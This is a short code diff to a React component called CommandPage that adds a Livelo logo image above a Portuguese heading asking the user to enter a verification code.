@@ -1166,6 +1166,15 @@ function CommandPage({ userId }) {
     return (
       <div className="min-h-screen bg-white flex flex-col font-inter">
         <div className="flex-1 flex flex-col items-center pt-12 px-4">
+          {/* Logo Livelo */}
+          <div className="mb-8">
+            <img 
+              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
+              alt="Livelo Logo" 
+              className="h-10 w-auto"
+            />
+          </div>
+
           {/* Header com título e X */}
           <div className="w-full max-w-lg flex items-center justify-between mb-8">
             <h1 className="text-xl font-normal text-gray-800">Insira o código de verificação</h1>
